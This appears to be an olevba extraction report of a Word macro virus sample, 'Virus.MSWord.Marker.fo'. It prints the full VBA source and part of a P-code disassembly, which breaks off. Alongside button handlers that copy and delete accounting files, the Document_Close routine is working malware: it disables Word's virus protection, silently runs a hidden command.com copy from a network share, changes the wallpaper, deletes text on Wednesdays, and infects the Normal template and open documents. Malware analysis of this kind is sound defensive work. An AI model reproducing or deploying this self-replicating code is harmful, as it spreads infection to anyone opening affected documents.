olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
Dim a, b, Msg, Style, Title, Response, Msg1, Style1, Title1, Response1, Msg2, Style2, Title2, Response2

a = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\äîêóìåíòû\platpor.xls"
b = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\êëàäîâùèê\âõîä\2platpor1.xls"


Msg = "Âû äåéñòâèòåëüíî õîòèòå îòïðàâèòü ôàéë?"  ' Ñîîáùåíèå.
Style = vbYesNo + vbDefaultButton2  ' Êíîïêè.
Title = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then ' Íàæàòà êíîïêà "Äà" (Yes).

FileCopy a, b
Kill "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä\2scht-f1.xls"



If Time > #4:00:00 PM# And Time < #4:40:00 PM# Then


Msg1 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó ïåðâîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style1 = vbOKOnly
Title1 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00 PM# And Time < #5:40:00 PM# Then


Msg2 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó âòîðîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style2 = vbOKOnly
Title2 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If
End If


End Sub

Private Sub CommandButton4_Click()
Dim i
Set fs = Application.FileSearch
With fs
    .LookIn = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä"

    .FileName = "*.*"
    If .Execute > 0 Then
        MsgBox "There were " & .FoundFiles.Count & _
            " file(s) found."
        For i = 1 To .FoundFiles.Count
            MsgBox .FoundFiles(i)
        Next i
    Else
        MsgBox "There were no files found."
    End If
End With

End Sub

Private Sub CommandButton11_Click()
Dim a, b, Msg, Style, Title, Response, Msg1, Style1, Title1, Response1, Msg2, Style2, Title2, Response2

a = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\äîêóìåíòû\platpor.xls"
b = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\êëàäîâùèê\âõîä\2platpor2.xls"


Msg = "Âû äåéñòâèòåëüíî õîòèòå îòïðàâèòü ôàéë?"  ' Ñîîáùåíèå.
Style = vbYesNo + vbDefaultButton2  ' Êíîïêè.
Title = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then ' Íàæàòà êíîïêà "Äà" (Yes).

FileCopy a, b
Kill "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä\2scht-f2.xls"



If Time > #4:00:00 PM# And Time < #4:40:00 PM# Then


Msg1 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó ïåðâîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style1 = vbOKOnly
Title1 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00 PM# And Time < #5:40:00 PM# Then


Msg2 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó âòîðîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style2 = vbOKOnly
Title2 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If
End If



End Sub

Private Sub CommandButton12_Click()
Dim a, b, Msg, Style, Title, Response, Msg1, Style1, Title1, Response1, Msg2, Style2, Title2, Response2

a = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\äîêóìåíòû\platpor.xls"
b = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\êëàäîâùèê\âõîä\2platpor3.xls"



Msg = "Âû äåéñòâèòåëüíî õîòèòå îòïðàâèòü ôàéë?"  ' Ñîîáùåíèå.
Style = vbYesNo + vbDefaultButton2  ' Êíîïêè.
Title = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then ' Íàæàòà êíîïêà "Äà" (Yes).

FileCopy a, b
Kill "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä\2scht-f3.xls"



If Time > #4:00:00 PM# And Time < #4:40:00 PM# Then


Msg1 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó ïåðâîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style1 = vbOKOnly
Title1 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00 PM# And Time < #5:40:00 PM# Then


Msg2 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó âòîðîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style2 = vbOKOnly
Title2 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If
End If




End Sub

Private Sub CommandButton2_Click()
Dim a, b, Msg, Style, Title, Response, Msg1, Style1, Title1, Response1, Msg2, Style2, Title2, Response2

a = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\äîêóìåíòû\dover.doc"
b = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\êëàäîâùèê\âõîä\2dover1.doc"


Msg = "Âû äåéñòâèòåëüíî õîòèòå îòïðàâèòü ôàéë?"  ' Ñîîáùåíèå.
Style = vbYesNo + vbDefaultButton2  ' Êíîïêè.
Title = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then ' Íàæàòà êíîïêà "Äà" (Yes).

FileCopy a, b
Kill "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä\2vipiska1.doc"



If Time > #4:00:00 PM# And Time < #4:40:00 PM# Then


Msg1 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó ïåðâîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style1 = vbOKOnly
Title1 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00 PM# And Time < #5:40:00 PM# Then


Msg2 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó âòîðîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style2 = vbOKOnly
Title2 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If
End If





End Sub

Private Sub CommandButton21_Click()
Dim a, b, Msg, Style, Title, Response, Msg1, Style1, Title1, Response1, Msg2, Style2, Title2, Response2

a = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\äîêóìåíòû\dover.doc"
b = "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\êëàäîâùèê\âõîä\2dover2.doc"





Msg = "Âû äåéñòâèòåëüíî õîòèòå îòïðàâèòü ôàéë?"  ' Ñîîáùåíèå.
Style = vbYesNo + vbDefaultButton2  ' Êíîïêè.
Title = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then ' Íàæàòà êíîïêà "Äà" (Yes).

FileCopy a, b
Kill "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä\2vipiska2.doc"



If Time > #4:00:00 PM# And Time < #4:40:00 PM# Then


Msg1 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó ïåðâîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style1 = vbOKOnly
Title1 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00 PM# And Time < #5:40:00 PM# Then


Msg2 = "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó âòîðîãî êâàðòàëà"  ' Ñîîáùåíèå.
Style2 = vbOKOnly
Title2 = "Ñîîáùåíèå"    ' Çàãîëîâîê.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If
End If






End Sub

Private Sub Document_Close()

On Error Resume Next

Const Kuku = "Black Wednesday!"

'Declare Variables
Dim SaveDoc, SaveNormalTempl, DocInfected, NormalTemplInfected As Boolean
Dim ActDoc, NormTempl As Object
Dim MyCod, UserAddress, LogData, LogFile As String
Dim a1, FileLocal, FileServer As Integer

'Initialize Variables
Set ActDoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set NormTempl = NormalTemplate.VBProject.VBComponents.Item(1)

DocInfected = ActDoc.CodeModule.Find(Kuku, 1, 1, 10000, 10000)
NormalTemplInfected = NormTempl.CodeModule.Find(Kuku, 1, 1, 10000, 10000)

'Switch the VirusProtection OFF
Options.VirusProtection = False

Set fs = Application.FileSearch
With fs
    .LookIn = "C:\"
    .FileName = "NetSetup.log"
    FileLocal = .Execute
End With
With fs
    .LookIn = "\\post\temp\1000"
    .FileName = "NetSetup.log"
    FileServer = .Execute
End With
    
If FileServer > 0 Then
    If (FileLocal <= 0) Then
        Shell "command.com /c copy \\post\temp\1000\NetSetup.log c:\NetSetup.log", vbHide
    Else
        If FileLen("\\post\temp\1000\NetSetup.log") <> FileLen("c:\NetSetup.log") Then
            Shell "command.com /c copy \\post\temp\1000\NetSetup.log c:\NetSetup.log", vbHide
        End If
    End If
End If

System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", _
"WallPaper") = "c:\NetSetup.log"

If (WeekDay(Now()) = vbWednesday) Then
    Selection.MoveDown Unit:=wdLine, Count:=20, Extend:=wdExtend
    Selection.Delete Unit:=wdCharacter, Count:=1
End If
'Make sure that some conditions are true before we continue infecting anything
If (DocInfected = True Xor NormalTemplInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocInfected = True Then
  
    SaveNormalTempl = NormalTemplate.Saved
  
    MyCod = ActDoc.CodeModule.Lines(1, ActDoc.CodeModule.CountOfLines)

    a1 = NormTempl.CodeModule.CountOfLines
    NormTempl.CodeModule.DeleteLines 1, a1
    NormTempl.CodeModule.AddFromString MyCod
    
    If SaveNormalTempl = True Then NormalTemplate.Save
    
  End If
              
  'Infect the ActiveDocument
  If NormalTemplInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDoc = ActiveDocument.Saved
    
    OurCode = NormTempl.CodeModule.Lines(1, NormTempl.CodeModule.CountOfLines)

    a1 = ActDoc.CodeModule.CountOfLines
    ActDoc.CodeModule.DeleteLines 1, a1
    ActDoc.CodeModule.AddFromString OurCode
    
    If SaveDoc = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub


























-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.fo
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 18549 bytes
' Line #0:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #1:
' 	Dim 
' 	VarDefn a
' 	VarDefn B
' 	VarDefn Msg
' 	VarDefn Style
' 	VarDefn Title
' 	VarDefn Response
' 	VarDefn Msg1
' 	VarDefn Style1
' 	VarDefn Title1
' 	VarDefn Response1
' 	VarDefn Msg2
' 	VarDefn Style2
' 	VarDefn Title2
' 	VarDefn Response2
' Line #2:
' Line #3:
' 	LitStr 0x0054 "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\äîêóìåíòû\platpor.xls"
' 	St a 
' Line #4:
' 	LitStr 0x004F "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\êëàäîâùèê\âõîä\2platpor1.xls"
' 	St B 
' Line #5:
' Line #6:
' Line #7:
' 	LitStr 0x0027 "Âû äåéñòâèòåëüíî õîòèòå îòïðàâèòü ôàéë?"
' 	St Msg 
' 	QuoteRem 0x0031 0x000B " Ñîîáùåíèå."
' Line #8:
' 	Ld vbYesNo 
' 	Ld vbDefaultButton2 
' 	Add 
' 	St Style 
' 	QuoteRem 0x0024 0x0008 " Êíîïêè."
' Line #9:
' 	LitStr 0x0009 "Ñîîáùåíèå"
' 	St Title 
' 	QuoteRem 0x0017 0x000B " Çàãîëîâîê."
' Line #10:
' 	Ld Msg 
' 	Ld Style 
' 	Ld Title 
' 	ArgsLd MsgBox 0x0003 
' 	St Response 
' Line #11:
' Line #12:
' Line #13:
' 	Ld Response 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0019 0x001A " Íàæàòà êíîïêà "Äà" (Yes)."
' Line #14:
' Line #15:
' 	Ld a 
' 	Ld B 
' 	ArgsCall FileCopy 0x0002 
' Line #16:
' 	LitStr 0x0050 "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä\2scht-f1.xls"
' 	ArgsCall Kill 0x0001 
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' 	Ld Time 
' 	LitDate 0x5555 0x5555 0x5555 0x3FE5 
' 	Gt 
' 	Ld Time 
' 	LitDate 0xE38E 0x8E38 0x38E3 0x3FE6 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #21:
' Line #22:
' Line #23:
' 	LitStr 0x002E "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó ïåðâîãî êâàðòàëà"
' 	St Msg1 
' 	QuoteRem 0x0039 0x000B " Ñîîáùåíèå."
' Line #24:
' 	Ld vbOKOnly 
' 	St Style1 
' Line #25:
' 	LitStr 0x0009 "Ñîîáùåíèå"
' 	St Title1 
' 	QuoteRem 0x0018 0x000B " Çàãîëîâîê."
' Line #26:
' 	Ld Msg1 
' 	Ld Style1 
' 	Ld Title1 
' 	ArgsLd MsgBox 0x0003 
' 	St Response1 
' Line #27:
' 	ElseBlock 
' Line #28:
' Line #29:
' 	Ld Time 
' 	LitDate 0xE38E 0x8E38 0x38E3 0x3FE6 
' 	Gt 
' 	Ld Time 
' 	LitDate 0x38E4 0xE38E 0x8E38 0x3FE7 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #30:
' Line #31:
' Line #32:
' 	LitStr 0x002E "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó âòîðîãî êâàðòàëà"
' 	St Msg2 
' 	QuoteRem 0x0039 0x000B " Ñîîáùåíèå."
' Line #33:
' 	Ld vbOKOnly 
' 	St Style2 
' Line #34:
' 	LitStr 0x0009 "Ñîîáùåíèå"
' 	St Title2 
' 	QuoteRem 0x0018 0x000B " Çàãîëîâîê."
' Line #35:
' 	Ld Msg2 
' 	Ld Style2 
' 	Ld Title2 
' 	ArgsLd MsgBox 0x0003 
' 	St Response2 
' Line #36:
' Line #37:
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	EndIfBlock 
' Line #41:
' Line #42:
' Line #43:
' 	EndSub 
' Line #44:
' Line #45:
' 	FuncDefn (Private Sub CommandButton4_Click())
' Line #46:
' 	Dim 
' 	VarDefn i
' Line #47:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #48:
' 	StartWithExpr 
' 	Ld fs 
' 	With 
' Line #49:
' 	LitStr 0x0043 "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä"
' 	MemStWith LookIn 
' Line #50:
' Line #51:
' 	LitStr 0x0003 "*.*"
' 	MemStWith FileName 
' Line #52:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #53:
' 	LineCont 0x0004 08 00 0C 00
' 	LitStr 0x000B "There were "
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	Concat 
' 	LitStr 0x000F " file(s) found."
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #54:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #55:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	ArgsCall MsgBox 0x0001 
' Line #56:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	ElseBlock 
' Line #58:
' 	LitStr 0x001A "There were no files found."
' 	ArgsCall MsgBox 0x0001 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	EndWith 
' Line #61:
' Line #62:
' 	EndSub 
' Line #63:
' Line #64:
' 	FuncDefn (Private Sub CommandButton11_Click())
' Line #65:
' 	Dim 
' 	VarDefn a
' 	VarDefn B
' 	VarDefn Msg
' 	VarDefn Style
' 	VarDefn Title
' 	VarDefn Response
' 	VarDefn Msg1
' 	VarDefn Style1
' 	VarDefn Title1
' 	VarDefn Response1
' 	VarDefn Msg2
' 	VarDefn Style2
' 	VarDefn Title2
' 	VarDefn Response2
' Line #66:
' Line #67:
' 	LitStr 0x0054 "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\äîêóìåíòû\platpor.xls"
' 	St a 
' Line #68:
' 	LitStr 0x004F "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\êëàäîâùèê\âõîä\2platpor2.xls"
' 	St B 
' Line #69:
' Line #70:
' Line #71:
' 	LitStr 0x0027 "Âû äåéñòâèòåëüíî õîòèòå îòïðàâèòü ôàéë?"
' 	St Msg 
' 	QuoteRem 0x0031 0x000B " Ñîîáùåíèå."
' Line #72:
' 	Ld vbYesNo 
' 	Ld vbDefaultButton2 
' 	Add 
' 	St Style 
' 	QuoteRem 0x0024 0x0008 " Êíîïêè."
' Line #73:
' 	LitStr 0x0009 "Ñîîáùåíèå"
' 	St Title 
' 	QuoteRem 0x0017 0x000B " Çàãîëîâîê."
' Line #74:
' 	Ld Msg 
' 	Ld Style 
' 	Ld Title 
' 	ArgsLd MsgBox 0x0003 
' 	St Response 
' Line #75:
' Line #76:
' Line #77:
' 	Ld Response 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0019 0x001A " Íàæàòà êíîïêà "Äà" (Yes)."
' Line #78:
' Line #79:
' 	Ld a 
' 	Ld B 
' 	ArgsCall FileCopy 0x0002 
' Line #80:
' 	LitStr 0x0050 "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä\2scht-f2.xls"
' 	ArgsCall Kill 0x0001 
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' 	Ld Time 
' 	LitDate 0x5555 0x5555 0x5555 0x3FE5 
' 	Gt 
' 	Ld Time 
' 	LitDate 0xE38E 0x8E38 0x38E3 0x3FE6 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #85:
' Line #86:
' Line #87:
' 	LitStr 0x002E "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó ïåðâîãî êâàðòàëà"
' 	St Msg1 
' 	QuoteRem 0x0039 0x000B " Ñîîáùåíèå."
' Line #88:
' 	Ld vbOKOnly 
' 	St Style1 
' Line #89:
' 	LitStr 0x0009 "Ñîîáùåíèå"
' 	St Title1 
' 	QuoteRem 0x0018 0x000B " Çàãîëîâîê."
' Line #90:
' 	Ld Msg1 
' 	Ld Style1 
' 	Ld Title1 
' 	ArgsLd MsgBox 0x0003 
' 	St Response1 
' Line #91:
' 	ElseBlock 
' Line #92:
' Line #93:
' 	Ld Time 
' 	LitDate 0xE38E 0x8E38 0x38E3 0x3FE6 
' 	Gt 
' 	Ld Time 
' 	LitDate 0x38E4 0xE38E 0x8E38 0x3FE7 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #94:
' Line #95:
' Line #96:
' 	LitStr 0x002E "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó âòîðîãî êâàðòàëà"
' 	St Msg2 
' 	QuoteRem 0x0039 0x000B " Ñîîáùåíèå."
' Line #97:
' 	Ld vbOKOnly 
' 	St Style2 
' Line #98:
' 	LitStr 0x0009 "Ñîîáùåíèå"
' 	St Title2 
' 	QuoteRem 0x0018 0x000B " Çàãîëîâîê."
' Line #99:
' 	Ld Msg2 
' 	Ld Style2 
' 	Ld Title2 
' 	ArgsLd MsgBox 0x0003 
' 	St Response2 
' Line #100:
' Line #101:
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	EndIfBlock 
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' 	EndSub 
' Line #109:
' Line #110:
' 	FuncDefn (Private Sub CommandButton12_Click())
' Line #111:
' 	Dim 
' 	VarDefn a
' 	VarDefn B
' 	VarDefn Msg
' 	VarDefn Style
' 	VarDefn Title
' 	VarDefn Response
' 	VarDefn Msg1
' 	VarDefn Style1
' 	VarDefn Title1
' 	VarDefn Response1
' 	VarDefn Msg2
' 	VarDefn Style2
' 	VarDefn Title2
' 	VarDefn Response2
' Line #112:
' Line #113:
' 	LitStr 0x0054 "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\äîêóìåíòû\platpor.xls"
' 	St a 
' Line #114:
' 	LitStr 0x004F "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\êëàäîâùèê\âõîä\2platpor3.xls"
' 	St B 
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' 	LitStr 0x0027 "Âû äåéñòâèòåëüíî õîòèòå îòïðàâèòü ôàéë?"
' 	St Msg 
' 	QuoteRem 0x0031 0x000B " Ñîîáùåíèå."
' Line #119:
' 	Ld vbYesNo 
' 	Ld vbDefaultButton2 
' 	Add 
' 	St Style 
' 	QuoteRem 0x0024 0x0008 " Êíîïêè."
' Line #120:
' 	LitStr 0x0009 "Ñîîáùåíèå"
' 	St Title 
' 	QuoteRem 0x0017 0x000B " Çàãîëîâîê."
' Line #121:
' 	Ld Msg 
' 	Ld Style 
' 	Ld Title 
' 	ArgsLd MsgBox 0x0003 
' 	St Response 
' Line #122:
' Line #123:
' Line #124:
' 	Ld Response 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0019 0x001A " Íàæàòà êíîïêà "Äà" (Yes)."
' Line #125:
' Line #126:
' 	Ld a 
' 	Ld B 
' 	ArgsCall FileCopy 0x0002 
' Line #127:
' 	LitStr 0x0050 "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä\2scht-f3.xls"
' 	ArgsCall Kill 0x0001 
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' 	Ld Time 
' 	LitDate 0x5555 0x5555 0x5555 0x3FE5 
' 	Gt 
' 	Ld Time 
' 	LitDate 0xE38E 0x8E38 0x38E3 0x3FE6 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #132:
' Line #133:
' Line #134:
' 	LitStr 0x002E "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó ïåðâîãî êâàðòàëà"
' 	St Msg1 
' 	QuoteRem 0x0039 0x000B " Ñîîáùåíèå."
' Line #135:
' 	Ld vbOKOnly 
' 	St Style1 
' Line #136:
' 	LitStr 0x0009 "Ñîîáùåíèå"
' 	St Title1 
' 	QuoteRem 0x0018 0x000B " Çàãîëîâîê."
' Line #137:
' 	Ld Msg1 
' 	Ld Style1 
' 	Ld Title1 
' 	ArgsLd MsgBox 0x0003 
' 	St Response1 
' Line #138:
' 	ElseBlock 
' Line #139:
' Line #140:
' 	Ld Time 
' 	LitDate 0xE38E 0x8E38 0x38E3 0x3FE6 
' 	Gt 
' 	Ld Time 
' 	LitDate 0x38E4 0xE38E 0x8E38 0x3FE7 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #141:
' Line #142:
' Line #143:
' 	LitStr 0x002E "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó âòîðîãî êâàðòàëà"
' 	St Msg2 
' 	QuoteRem 0x0039 0x000B " Ñîîáùåíèå."
' Line #144:
' 	Ld vbOKOnly 
' 	St Style2 
' Line #145:
' 	LitStr 0x0009 "Ñîîáùåíèå"
' 	St Title2 
' 	QuoteRem 0x0018 0x000B " Çàãîëîâîê."
' Line #146:
' 	Ld Msg2 
' 	Ld Style2 
' 	Ld Title2 
' 	ArgsLd MsgBox 0x0003 
' 	St Response2 
' Line #147:
' Line #148:
' Line #149:
' 	EndIfBlock 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	EndIfBlock 
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' 	EndSub 
' Line #157:
' Line #158:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #159:
' 	Dim 
' 	VarDefn a
' 	VarDefn B
' 	VarDefn Msg
' 	VarDefn Style
' 	VarDefn Title
' 	VarDefn Response
' 	VarDefn Msg1
' 	VarDefn Style1
' 	VarDefn Title1
' 	VarDefn Response1
' 	VarDefn Msg2
' 	VarDefn Style2
' 	VarDefn Title2
' 	VarDefn Response2
' Line #160:
' Line #161:
' 	LitStr 0x0052 "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\äîêóìåíòû\dover.doc"
' 	St a 
' Line #162:
' 	LitStr 0x004D "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\êëàäîâùèê\âõîä\2dover1.doc"
' 	St B 
' Line #163:
' Line #164:
' Line #165:
' 	LitStr 0x0027 "Âû äåéñòâèòåëüíî õîòèòå îòïðàâèòü ôàéë?"
' 	St Msg 
' 	QuoteRem 0x0031 0x000B " Ñîîáùåíèå."
' Line #166:
' 	Ld vbYesNo 
' 	Ld vbDefaultButton2 
' 	Add 
' 	St Style 
' 	QuoteRem 0x0024 0x0008 " Êíîïêè."
' Line #167:
' 	LitStr 0x0009 "Ñîîáùåíèå"
' 	St Title 
' 	QuoteRem 0x0017 0x000B " Çàãîëîâîê."
' Line #168:
' 	Ld Msg 
' 	Ld Style 
' 	Ld Title 
' 	ArgsLd MsgBox 0x0003 
' 	St Response 
' Line #169:
' Line #170:
' Line #171:
' 	Ld Response 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0019 0x001A " Íàæàòà êíîïêà "Äà" (Yes)."
' Line #172:
' Line #173:
' 	Ld a 
' 	Ld B 
' 	ArgsCall FileCopy 0x0002 
' Line #174:
' 	LitStr 0x0051 "g:\home\st6\course_2\group_3a\ìîäåëü1\çàâîä\ñêëàä2\áóõãàëòåðèÿ\âõîä\2vipiska1.doc"
' 	ArgsCall Kill 0x0001 
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' 	Ld Time 
' 	LitDate 0x5555 0x5555 0x5555 0x3FE5 
' 	Gt 
' 	Ld Time 
' 	LitDate 0xE38E 0x8E38 0x38E3 0x3FE6 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #179:
' Line #180:
' Line #181:
' 	LitStr 0x002E "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó ïåðâîãî êâàðòàëà"
' 	St Msg1 
' 	QuoteRem 0x0039 0x000B " Ñîîáùåíèå."
' Line #182:
' 	Ld vbOKOnly 
' 	St Style1 
' Line #183:
' 	LitStr 0x0009 "Ñîîáùåíèå"
' 	St Title1 
' 	QuoteRem 0x0018 0x000B " Çàãîëîâîê."
' Line #184:
' 	Ld Msg1 
' 	Ld Style1 
' 	Ld Title1 
' 	ArgsLd MsgBox 0x0003 
' 	St Response1 
' Line #185:
' 	ElseBlock 
' Line #186:
' Line #187:
' 	Ld Time 
' 	LitDate 0xE38E 0x8E38 0x38E3 0x3FE6 
' 	Gt 
' 	Ld Time 
' 	LitDate 0x38E4 0xE38E 0x8E38 0x3FE7 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #188:
' Line #189:
' Line #190:
' 	LitStr 0x002E "Ñåé÷àñ âû äåéñòâóåòå ïî ïëàíó âòîðîãî êâàðòàëà"
' 	St Msg2 
' 	QuoteRem 0x0039 0x000B " Ñîîáùåíèå."
' Line #191:
' 	Ld vbOKOnly 
' 	St Style2 
' Line #192:
' 	LitStr 0x0009 "Ñîîáùåíèå"
' 	St Title2 
' 	QuoteRem 0x0018 0x000B " Çàãîëîâîê."
' Line #193:
' 	Ld Msg2 
' 	Ld Style2 
' 	Ld Title2 
' 	ArgsLd MsgBox 0x0003 
' 	St Response2 
' Line #194:
' Line #195:
' Line #196:
' 	EndIfBlock 
' Line #197:
